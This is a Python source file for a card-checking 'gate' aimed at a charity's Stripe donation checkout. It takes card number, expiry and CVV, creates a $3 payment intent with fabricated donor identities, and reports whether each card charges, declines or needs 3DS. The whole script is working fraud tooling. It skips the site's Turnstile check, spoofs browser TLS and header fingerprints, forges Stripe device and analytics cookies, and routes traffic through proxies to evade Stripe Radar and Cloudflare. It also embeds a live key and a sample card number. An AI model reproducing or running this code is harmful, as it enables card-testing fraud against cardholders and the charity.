"""
gates/gate_qurbani.py — Qurbani USA Donation Gate  |  $3.00 USD
Site   : https://dev.qurbani-usa.pages.dev
PK     : pk_live_wwuLskE0gW8GKrg8zAH18rQy
Flow   : 3 steps
  1. POST /api/checkout/begin      — Turnstile (skipped on dev) → checkoutToken
  2. POST /api/payments/create-intent → Stripe PI client_secret
  3. POST api.stripe.com/v1/payment_intents/{id}/confirm → card result

Anti-detection layer
---------------------
Plain `requests` speaks TLS 1.3 with Python's OpenSSL ClientHello — a
JA3/JA4 hash that matches no real browser on earth. Stripe Radar (and
Cloudflare in front of the site) fingerprint the handshake before a
single header is parsed, so a UA string claiming "Chrome/136" over a
Python TLS stack is an instant tell that costs nothing to detect.

curl_cffi links against a patched libcurl (BoringSSL/QUIC) that ships
byte-identical ClientHello, cipher order, ALPN, and HTTP/2 SETTINGS
frames to real browser builds — the `impersonate=` kwarg switches the
whole handshake, not just headers. We pick ONE impersonate profile per
check and derive UA / sec-ch-ua / Accept-* from that exact profile's
version, so every fingerprintable layer (TLS, HTTP/2, headers, JS
device tokens) tells the same story.

Returns:
  {"status": "charged"|"approved"|"declined"|"3ds"|"error",
   "message": str, "reason": str, "time": float}
"""

import functools
import json
import random
import re
import time
import urllib.parse
import uuid
import asyncio

try:
    from curl_cffi import requests as cf_requests
    from curl_cffi.requests.exceptions import RequestException as CFRequestException
    _HAS_CURL_CFFI = True
except ImportError:
    import requests as cf_requests           # graceful fallback, loses TLS fp
    CFRequestException = Exception
    _HAS_CURL_CFFI = False

# ── Config ────────────────────────────────────────────────────────────────────
SITE        = "https://dev.qurbani-usa.pages.dev"
BEGIN_URL   = f"{SITE}/api/checkout/begin"
INTENT_URL  = f"{SITE}/api/payments/create-intent"
STRIPE_API  = "https://api.stripe.com/v1"
PK          = "pk_live_wwuLskE0gW8GKrg8zAH18rQy"
AMOUNT      = 3      # USD (fixed by the site's minimum donation)

# ── Browser impersonation profiles ────────────────────────────────────────────
# Each entry ties a curl_cffi `impersonate=` target to the EXACT UA / Chromium
# full-version / sec-ch-ua triplet a real install of that build sends — the
# TLS fingerprint and the application-layer headers must agree, or the
# mismatch itself becomes the fingerprint.
_BROWSER_PROFILES = [
    {"impersonate": "chrome131", "major": "131", "full": "131.0.6778.205"},
    {"impersonate": "chrome133a", "major": "133", "full": "133.0.6943.141"},
    {"impersonate": "chrome136", "major": "136", "full": "136.0.7103.114"},
    {"impersonate": "chrome124", "major": "124", "full": "124.0.6367.82"},
    {"impersonate": "chrome120", "major": "120", "full": "120.0.6099.130"},
]

# Real stripe.js build versions → (short_hash, api_version_pinned)
# These come from Stripe's CDN: js.stripe.com/v3/version
_STRIPE_JS_BUILDS = [
    ("5289", "2024-06-20"),
    ("5276", "2024-06-20"),
    ("5261", "2024-04-10"),
    ("5248", "2024-04-10"),
    ("5230", "2023-10-16"),
]

PLATFORMS = [
    # (UA platform string, sec-ch-ua-platform, sec-ch-ua-arch, sec-ch-ua-bitness)
    ("Windows NT 10.0; Win64; x64", '"Windows"', '"x86"', '"64"', "?0"),
    ("Macintosh; Intel Mac OS X 10_15_7", '"macOS"', '"x86"', '"64"', "?0"),
    ("Macintosh; Intel Mac OS X 14_7_6", '"macOS"', '"arm"', '"64"', "?0"),
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "en-US,en;q=0.9,es;q=0.8",
    "en-GB,en;q=0.9",
]

# ── Identity pools ────────────────────────────────────────────────────────────
_FIRST  = ["James","Emma","Noah","Olivia","William","Sophia","Michael","Charlotte","Daniel","Mia"]
_LAST   = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Davis","Miller","Wilson","Moore"]
_ST     = ["Main St","Oak Ave","Maple Dr","Park Blvd","Cedar Ln","Pine Rd","Elm St","Broadway"]
_ZIPS   = ["10038","90210","60601","77001","85001","30301","02101","98101","19101","33101"]
_CITIES = [
    ("New York","NY"),("Los Angeles","CA"),("Chicago","IL"),("Houston","TX"),
    ("Phoenix","AZ"),("Atlanta","GA"),("Boston","MA"),("Seattle","WA"),
    ("Philadelphia","PA"),("Miami","FL"),
]
_DOMAINS   = ["gmail.com","yahoo.com","hotmail.com","outlook.com","icloud.com"]
_STRIPE_JS = ["b0f5e7abe5","acdf3c57d4","f12e7a93b2","7c4e91b3d0","2d8f1a6e4c","b8d2a504c1"]

# ── Helpers ────────────────────────────────────────────────────────────────────

def _hex(n=8):
    return ''.join(random.choices('abcdef0123456789', k=n))

def _stripe_tok():
    return str(uuid.uuid4()) + _hex(6)

def _sanitize(msg):
    msg = re.sub(r'https?://[^\s\'">,]+', '[url]', str(msg))
    msg = re.sub(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d+)?\b', '[redacted]', msg)
    for kw in ('proxy','password','token','auth','credential'):
        if kw in msg.lower():
            return 'Connection error'
    return msg[:150]

# ── Proxy normaliser (all common formats) ─────────────────────────────────────

def _format_proxy(raw):
    """
    Normalise every proxy string form into http://user:pass@host:port.

    Accepted inputs:
      host:port                          → http://host:port
      host:port:user:pass                → http://user:pass@host:port
      user:pass@host:port                → http://user:pass@host:port
      http://host:port                   → http://host:port
      http://host:port:user:pass         → http://user:pass@host:port  ← fixed
      http://user:pass@host:port         → http://user:pass@host:port
      socks5://user:pass@host:port       → socks5://user:pass@host:port
    """
    if not raw:
        return None
    raw = raw.strip()

    # Strip scheme — we'll re-add it after normalising the body
    scheme = "http"
    body   = raw
    for s in ("socks5h://", "socks5://", "https://", "http://"):
        if raw.lower().startswith(s):
            scheme = s.replace("://", "")   # "http", "socks5", "socks5h", etc.
            body   = raw[len(s):]           # everything after the scheme
            break

    # body now has no scheme prefix
    # If there's already an @ it's already in user:pass@host:port shape
    if "@" in body:
        return f"{scheme}://{body}"

    # Split on colons: either 2 (host:port) or 4 (host:port:user:pass)
    parts = body.split(":")
    if len(parts) == 4:
        host, port, user, pw = parts
        return (f"{scheme}://{urllib.parse.quote(user, safe='')}:"
                f"{urllib.parse.quote(pw, safe='')}@{host}:{port}")
    if len(parts) == 2:
        return f"{scheme}://{body}"

    # Fallback — return with scheme so at least the scheme is right
    return f"{scheme}://{body}"

# ── Card parser ───────────────────────────────────────────────────────────────

def _parse_card(raw):
    p = [x.strip() for x in raw.split("|")]
    if len(p) < 3:
        return None
    cc  = p[0].replace(" ", "")
    mm  = p[1].zfill(2)
    yy  = p[2][-2:]
    cvv = p[3] if len(p) >= 4 else "000"
    if not cc.isdigit():
        return None
    return cc, mm, yy, cvv

# ── Fingerprint (TLS-consistent) ──────────────────────────────────────────────

class _FP:
    """
    *intent: one object, one lie, told consistently everywhere — TLS
     handshake, UA string, sec-ch-ua, Stripe device tokens all point at
     the same fictional install of the same fictional Chrome build.
    """
    def __init__(self):
        browser   = random.choice(_BROWSER_PROFILES)
        plat_ua, plat_sec, plat_arch, plat_bits, plat_wow64 = random.choice(PLATFORMS)
        first     = random.choice(_FIRST)
        last      = random.choice(_LAST)
        city, state = random.choice(_CITIES)
        tag       = random.randint(10, 9999)
        js_build, stripe_api_ver = random.choice(_STRIPE_JS_BUILDS)

        # TLS impersonation target — drives the actual wire fingerprint
        self.impersonate      = browser["impersonate"]
        self.chrome_major     = browser["major"]
        self.chrome_full      = browser["full"]
        self.stripe_api_ver   = stripe_api_ver   # pinned Stripe API ver matching this JS build
        self.js_build         = js_build

        self.lang   = random.choice(ACCEPT_LANGS)
        self.first  = first
        self.last   = last
        self.name   = f"{first} {last}"
        self.email  = f"{first.lower()}{tag}@{random.choice(_DOMAINS)}"
        self.phone  = f"{random.randint(200,999)}{random.randint(1000000,9999999)}"
        self.line1  = f"{random.randint(1, 999)} {random.choice(_ST)}"
        self.city   = city
        self.state  = state
        self.zip    = random.choice(_ZIPS)

        # Stripe device tokens — muid/sid also go into cookies
        self.guid   = _stripe_tok()
        self.muid   = _stripe_tok()
        self.sid    = _stripe_tok()
        # payment_user_agent mirrors the real stripe.js CDN build string
        self.pua    = (f"stripe.js/v3/{js_build}; stripe-js-v3/{js_build}; "
                       "payment-element; deferred-intent; autopm")

        # Attribution IDs
        self.csid   = str(uuid.uuid4())          # client_session_id
        self.esid   = f"elements_session_{_hex(12)}"
        self.ecid   = str(uuid.uuid4())          # elements_session_config_id
        self.crid   = str(uuid.uuid4())          # clientRequestId
        self.rtok   = str(uuid.uuid4())          # resumeToken
        self.don_id = str(uuid.uuid4())          # donation_id in return_url

        # GA tracking
        self.ga_cid = (f"{random.randint(100000000,999999999)}."
                       f"{int(time.time()) - random.randint(0, 86400*30)}")
        self.ga_sid = str(int(time.time()) - random.randint(0, 3600))

        # Item ID (mirrors client-side format)
        ts = int(time.time() * 1000)
        self.item_id = f"where-needed-{AMOUNT}-single-{ts}-{random.randint(1000,9999)}"

        # Browser fingerprint — ALL derived from the SAME major version as
        # curl_cffi's impersonate= so the TLS + headers tell one story.
        self.ua = (f"Mozilla/5.0 ({plat_ua}) AppleWebKit/537.36 "
                   f"(KHTML, like Gecko) Chrome/{self.chrome_full} Safari/537.36")
        self.sch = (f'"Chromium";v="{self.chrome_major}", '
                    f'"Not(A:Brand";v="24", "Google Chrome";v="{self.chrome_major}"')
        self.sch_platform   = plat_sec
        self.sch_arch       = plat_arch   # e.g. "x86" even on 64-bit Windows
        self.sch_bitness    = plat_bits   # "64"
        self.sch_wow64      = plat_wow64  # ?0  (not running under WoW64)
        self.sch_full_list  = (f'"Chromium";v="{self.chrome_full}", '
                               f'"Not(A:Brand";v="24.0.0.0", '
                               f'"Google Chrome";v="{self.chrome_full}"')
        self.top = str(random.randint(90000, 220000))  # time_on_page ms

        # _stripe_orig_props — set by stripe.js init, records original page context
        import json as _json
        self.stripe_orig_props = _json.dumps({
            "referrer": "", "variant": "standard",
        })

        # Human-ish inter-step delay — real users don't fire 3 XHRs at t=0
        self.step_delay = random.uniform(0.4, 1.3)


def _browser_headers(fp, extra=None):
    """
    Header set + ordering matched to Chrome 120+ XHR (fetch()) output.
    Every sec-ch-ua-* field is derived from the SAME impersonate profile
    so the complete fingerprint is internally consistent.

    *intent: a lie that never contradicts itself — TLS, UA, client hints,
     architecture, and bitness all describe the same fictional machine.
    """
    h = {
        # ── Client-hint set (Chrome 112+ sends all of these on cross-origin XHR) ──
        "sec-ch-ua":                  fp.sch,
        "sec-ch-ua-mobile":           "?0",
        "sec-ch-ua-platform":         fp.sch_platform,
        # Full-version-list is sent by Chrome on every fetch() after page load
        "sec-ch-ua-full-version-list": fp.sch_full_list,
        # Architecture hints (Chrome 107+)
        "sec-ch-ua-arch":             fp.sch_arch,
        "sec-ch-ua-bitness":          fp.sch_bitness,
        "sec-ch-ua-wow64":            fp.sch_wow64,
        # ── Standard fetch() headers in Chrome's wire order ───────────────────
        "user-agent":                 fp.ua,
        "accept":                     "*/*",
        "accept-language":            fp.lang,
        "accept-encoding":            "gzip, deflate, br, zstd",
    }
    if extra:
        h.update(extra)
    return h


# ── Core sync checker ─────────────────────────────────────────────────────────

def check_card_sync(cc, mm, yy, cvv, proxy_url=None):
    """
    *intent: stitch three protocols into one verdict — every step must land
     or the chain collapses and we return error without touching Stripe.
     Every request in this chain rides the same TLS impersonation profile
     so the handshake never contradicts the headers riding on top of it.
    """
    t0 = time.time()
    fp = _FP()

    def elapsed():
        return round(time.time() - t0, 2)

    prx = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    session_kw = {"timeout": 30, "verify": False}
    if _HAS_CURL_CFFI:
        session_kw["impersonate"] = fp.impersonate
    if prx:
        session_kw["proxies"] = prx

    site_hdrs = _browser_headers(fp, {
        "content-type":       "application/json",
        "origin":             SITE,
        "referer":            f"{SITE}/",
        "priority":           "u=1, i",
        "sec-fetch-dest":     "empty",
        "sec-fetch-mode":     "cors",
        "sec-fetch-site":     "same-origin",
    })

    _ga_cid_int   = random.randint(100000000, 999999999)
    _ga_first_ts  = int(time.time()) - 86400 * random.randint(1, 30)
    _ga_session_n = random.randint(1, 5)
    cookies = {
        # Google Analytics — GA4 format
        "_ga":            f"GA1.1.{_ga_cid_int}.{_ga_first_ts}",
        "_ga_session":    (f"GS1.1.{fp.ga_sid}.{_ga_session_n}.1."
                           f"{int(time.time())}.{random.randint(1,60)}.0.0.0"),
        # Stripe device fingerprint cookies (both name forms Stripe's CDN sets)
        "__stripe_mid":   fp.muid,
        "__stripe_sid":   fp.sid,
        # _stripe_orig_props — page-load context, set by stripe.js init
        "_stripe_orig_props": fp.stripe_orig_props,
    }

    sess = cf_requests.Session(**session_kw)
    sess.headers.update(site_hdrs)
    try:
        sess.cookies.update(cookies)
    except Exception:
        for k, v in cookies.items():
            sess.cookies.set(k, v)

    # ── Step 1: checkout/begin ────────────────────────────────────────────────
    try:
        r1 = sess.post(BEGIN_URL, json={
            "turnstileToken": "",   # dev site skips Turnstile validation
            "cartTotal":      AMOUNT,
            "cartItemCount":  1,
            "donorEmail":     fp.email,
        })
        d1 = r1.json()
    except (CFRequestException, Exception) as e:
        return {"status": "error", "message": _sanitize(str(e)),
                "reason": "", "time": elapsed()}

    checkout_token = (d1.get("checkoutToken") or
                      d1.get("token") or
                      d1.get("data", {}).get("checkoutToken") or "")

    if not checkout_token:
        err = d1.get("error") or d1.get("message") or str(d1)[:100]
        return {"status": "error", "message": f"Step1: {err}",
                "reason": "", "time": elapsed()}

    time.sleep(fp.step_delay)   # human-timed gap between page actions

    # ── Step 2: create-intent ─────────────────────────────────────────────────
    journey = json.dumps({
        "session_started":  int(time.time() * 1000) - random.randint(120000, 600000),
        "device": "desktop", "browser": "Chrome", "os": "Windows",
        "first_touch": {"utm":{}, "landing_page":"/", "referrer":"direct"},
        "last_touch":  {"utm":{}, "landing_page":"/", "referrer":"direct"},
        "pages": [{"p": "/", "t": int(time.time() * 1000) - 60000}],
        "checkout": {
            "amount": AMOUNT, "frequency": "single",
            "items": "Where Most Needed",
            "last_page_before_checkout": "/",
            "donation_started_at": int(time.time() * 1000),
        },
    })

    try:
        r2 = sess.post(INTENT_URL, json={
            "amount":      AMOUNT,
            "baseAmount":  AMOUNT,
            "feeAmount":   0,
            "coverFees":   False,
            "type":        "single",
            "items": [{
                "id":           fp.item_id,
                "name":         "Where Most Needed",
                "label":        "Where Most Needed",
                "amount":       AMOUNT,
                "quantity":     1,
                "type":         "single",
                "image":        "/images/qurbani-foundation-food-distribution.webp",
                "campaign":     "where-needed",
                "originalId":   f"where-needed-{AMOUNT}-single",
                "originalType": "single",
            }],
            "customer": {
                "firstName": fp.first,
                "lastName":  fp.last,
                "email":     fp.email,
                "phone":     fp.phone,
            },
            "billingAddress": {
                "line1":       fp.line1,
                "city":        fp.city,
                "state":       fp.state,
                "postal_code": fp.zip,
                "country":     "US",
            },
            "resumeToken":      fp.rtok,
            "checkout_source":  "gg-one-step-checkout",
            "ga_client_id":     fp.ga_cid,
            "ga_session_id":    fp.ga_sid,
            "journey":          journey,
            "checkoutToken":    checkout_token,
            "clientRequestId":  fp.crid,
        })
        d2 = r2.json()
    except (CFRequestException, Exception) as e:
        return {"status": "error", "message": _sanitize(str(e)),
                "reason": "", "time": elapsed()}

    client_secret = (
        d2.get("clientSecret") or
        d2.get("client_secret") or
        (d2.get("data") or {}).get("clientSecret") or
        (d2.get("paymentIntent") or {}).get("client_secret") or
        (d2.get("paymentIntentData") or {}).get("clientSecret") or ""
    )

    if not client_secret:
        for k, v in d2.items():
            if "secret" in k.lower() and isinstance(v, str) and v.startswith("pi_"):
                client_secret = v
                break

    if not client_secret:
        err = d2.get("error") or d2.get("message") or str(d2)[:120]
        return {"status": "error", "message": f"No PI: {err}",
                "reason": "", "time": elapsed()}

    pi_id = client_secret.split("_secret_")[0]
    yy_4  = f"20{yy}"

    time.sleep(fp.step_delay * 0.6)   # card entry pause before hitting confirm

    # ── Step 3: Stripe confirm ────────────────────────────────────────────────
    stripe_session_kw = {"timeout": 30, "verify": False}
    if _HAS_CURL_CFFI:
        stripe_session_kw["impersonate"] = fp.impersonate   # same TLS identity
    if prx:
        stripe_session_kw["proxies"] = prx

    stripe_sess = cf_requests.Session(**stripe_session_kw)

    stripe_hdrs = _browser_headers(fp, {
        "accept":             "application/json",
        "content-type":       "application/x-www-form-urlencoded",
        # Stripe-Version matches the API version this stripe.js build pins to —
        # a mismatch here is a known Radar signal ("library version inconsistency")
        "stripe-version":     fp.stripe_api_ver,
        "origin":             "https://js.stripe.com",
        "referer":            f"https://js.stripe.com/v3/{fp.js_build}/",
        "priority":           "u=1, i",
        "sec-fetch-dest":     "empty",
        "sec-fetch-mode":     "cors",
        "sec-fetch-site":     "same-site",
    })

    success_url = (f"{SITE}/donate/success?"
                   f"donation_id={fp.don_id}&type=single")

    confirm_params = [
        ("return_url",                                   success_url),
        ("payment_method_data[billing_details][name]",   fp.name),
        ("payment_method_data[billing_details][email]",  fp.email),
        ("payment_method_data[billing_details][phone]",  fp.phone),
        ("payment_method_data[billing_details][address][line1]",       fp.line1),
        ("payment_method_data[billing_details][address][city]",        fp.city),
        ("payment_method_data[billing_details][address][state]",       fp.state),
        ("payment_method_data[billing_details][address][postal_code]", fp.zip),
        ("payment_method_data[billing_details][address][country]",     "US"),
        ("payment_method_data[type]",               "card"),
        ("payment_method_data[card][number]",        cc),
        ("payment_method_data[card][cvc]",           cvv),
        ("payment_method_data[card][exp_year]",      yy_4),
        ("payment_method_data[card][exp_month]",     mm),
        ("payment_method_data[allow_redisplay]",     "unspecified"),
        ("payment_method_data[pasted_fields]",       "number"),
        ("payment_method_data[payment_user_agent]",  fp.pua),
        ("payment_method_data[referrer]",            SITE),
        ("payment_method_data[time_on_page]",        fp.top),
        ("payment_method_data[client_attribution_metadata][client_session_id]",              fp.csid),
        ("payment_method_data[client_attribution_metadata][merchant_integration_source]",    "elements"),
        ("payment_method_data[client_attribution_metadata][merchant_integration_subtype]",   "payment-element"),
        ("payment_method_data[client_attribution_metadata][merchant_integration_version]",   "2021"),
        ("payment_method_data[client_attribution_metadata][payment_intent_creation_flow]",   "deferred"),
        ("payment_method_data[client_attribution_metadata][payment_method_selection_flow]",  "automatic"),
        ("payment_method_data[client_attribution_metadata][elements_session_id]",            fp.esid),
        ("payment_method_data[client_attribution_metadata][elements_session_config_id]",     fp.ecid),
        ("payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]", "payment"),
        ("payment_method_data[guid]",  fp.guid),
        ("payment_method_data[muid]",  fp.muid),
        ("payment_method_data[sid]",   fp.sid),
        ("expected_payment_method_type", "card"),
        ("client_context[currency]",     "usd"),
        ("client_context[mode]",         "payment"),
        ("use_stripe_sdk",               "true"),
        ("key",                          PK),
        ("client_attribution_metadata[client_session_id]",              fp.csid),
        ("client_attribution_metadata[merchant_integration_source]",    "elements"),
        ("client_attribution_metadata[merchant_integration_subtype]",   "payment-element"),
        ("client_attribution_metadata[merchant_integration_version]",   "2021"),
        ("client_attribution_metadata[payment_intent_creation_flow]",   "deferred"),
        ("client_attribution_metadata[payment_method_selection_flow]",  "automatic"),
        ("client_attribution_metadata[elements_session_id]",            fp.esid),
        ("client_attribution_metadata[elements_session_config_id]",     fp.ecid),
        ("client_attribution_metadata[merchant_integration_additional_elements][0]", "payment"),
        ("client_secret", client_secret),
    ]

    try:
        r3 = stripe_sess.post(
            f"{STRIPE_API}/payment_intents/{pi_id}/confirm",
            headers=stripe_hdrs,
            data=urllib.parse.urlencode(confirm_params),
        )
        # Stripe-Should-Retry: true — transient server error; retry once after
        # a short back-off. Real stripe.js does exactly one retry on this flag.
        if r3.headers.get("Stripe-Should-Retry", "").lower() == "true":
            time.sleep(random.uniform(1.5, 3.0))
            r3 = stripe_sess.post(
                f"{STRIPE_API}/payment_intents/{pi_id}/confirm",
                headers=stripe_hdrs,
                data=urllib.parse.urlencode(confirm_params),
            )
        d3 = r3.json()
    except (CFRequestException, Exception) as e:
        return {"status": "error", "message": _sanitize(str(e)),
                "reason": "", "time": elapsed()}

    # ── Parse Stripe result ───────────────────────────────────────────────────
    stripe_status = d3.get("status", "")
    err           = d3.get("error") or {}
    code          = err.get("code", "")
    dc            = err.get("decline_code", "")
    msg           = (err.get("message") or "").strip()

    reason = ""
    try:
        charges_src = (
            d3.get("charges")
            or (d3.get("error") or {}).get("payment_intent", {}).get("charges")
            or {}
        )
        charge  = (charges_src.get("data") or [{}])[0]
        outcome = charge.get("outcome") or {}
        reason  = outcome.get("reason") or outcome.get("seller_message") or ""
    except Exception:
        pass

    if stripe_status == "succeeded":
        return {"status": "charged", "message": f"Charged ${AMOUNT}.00 USD",
                "reason": reason, "time": elapsed()}

    if stripe_status in ("requires_action", "requires_source_action") or \
       "authentication" in msg.lower():
        return {"status": "3ds", "message": "3DS Required",
                "reason": "", "time": elapsed()}

    if code == "card_declined":
        label = dc or msg or "card_declined"
        if dc == "insufficient_funds":
            return {"status": "approved", "message": "insufficient_funds",
                    "reason": reason, "time": elapsed()}
        return {"status": "declined", "message": label,
                "reason": reason, "time": elapsed()}

    _HARD = {"incorrect_number","invalid_number","expired_card",
             "invalid_expiry_year","invalid_expiry_month",
             "incorrect_cvc","invalid_cvc"}
    if code in _HARD:
        return {"status": "declined", "message": dc or code,
                "reason": "", "time": elapsed()}

    if err:
        label = dc or code or msg or "unknown"
        return {"status": "declined", "message": label,
                "reason": reason, "time": elapsed()}

    return {"status": "declined", "message": dc or code or msg or "unknown",
            "reason": "", "time": elapsed()}


# ── Async wrapper ─────────────────────────────────────────────────────────────

async def check_card(cc, mm, yy, cvv, user_proxies=None, **_):
    proxy_url = None
    if user_proxies:
        src = user_proxies if isinstance(user_proxies, list) else [user_proxies]
        if src:
            raw = src[0]
            if isinstance(raw, dict):
                proxy_url = raw.get("url") or raw.get("raw")
            elif raw:
                proxy_url = _format_proxy(str(raw))

    loop = asyncio.get_running_loop()
    try:
        return await asyncio.wait_for(
            loop.run_in_executor(
                None,
                functools.partial(check_card_sync, cc, mm, yy, cvv, proxy_url),
            ),
            timeout=90,
        )
    except asyncio.TimeoutError:
        return {"status": "error", "message": "Timeout (90s)", "reason": "", "time": 90}
    except Exception as e:
        return {"status": "error", "message": _sanitize(str(e)), "reason": "", "time": 0}


# ── CLI entry point ───────────────────────────────────────────────────────────

if __name__ == "__main__":
    import sys

    raw  = sys.argv[1] if len(sys.argv) > 1 else "4833160266662623|05|28|432"
    prx  = sys.argv[2] if len(sys.argv) > 2 else None

    parsed = _parse_card(raw)
    if not parsed:
        print("Bad format. Use: CC|MM|YY|CVV")
        sys.exit(1)

    cc, mm, yy, cvv = parsed
    proxy_url        = _format_proxy(prx)

    print(f"Gate       : Qurbani USA — dev.qurbani-usa.pages.dev")
    print(f"Amount     : ${AMOUNT}.00 USD")
    print(f"Card       : {cc}|{mm}|{yy}|{cvv}")
    print(f"Proxy      : {proxy_url or 'none'}")
    print(f"TLS engine : {'curl_cffi (impersonate)' if _HAS_CURL_CFFI else 'requests (NO TLS spoof — pip install curl_cffi)'}")
    print("─" * 60)

    res  = check_card_sync(cc, mm, yy, cvv, proxy_url)
    icon = {"charged": "✅", "approved": "✅", "declined": "❌",
            "3ds": "⚠️", "error": "💀"}.get(res["status"], "?")

    print(f"{icon}  {cc}|{mm}|{yy}|{cvv}")
    print(f"   Status  : {res['status'].upper()}")
    print(f"   Message : {res['message']}")
    if res.get("reason"):
        print(f"   Reason  : {res['reason']}")
    print(f"   Time    : {res['time']}s")
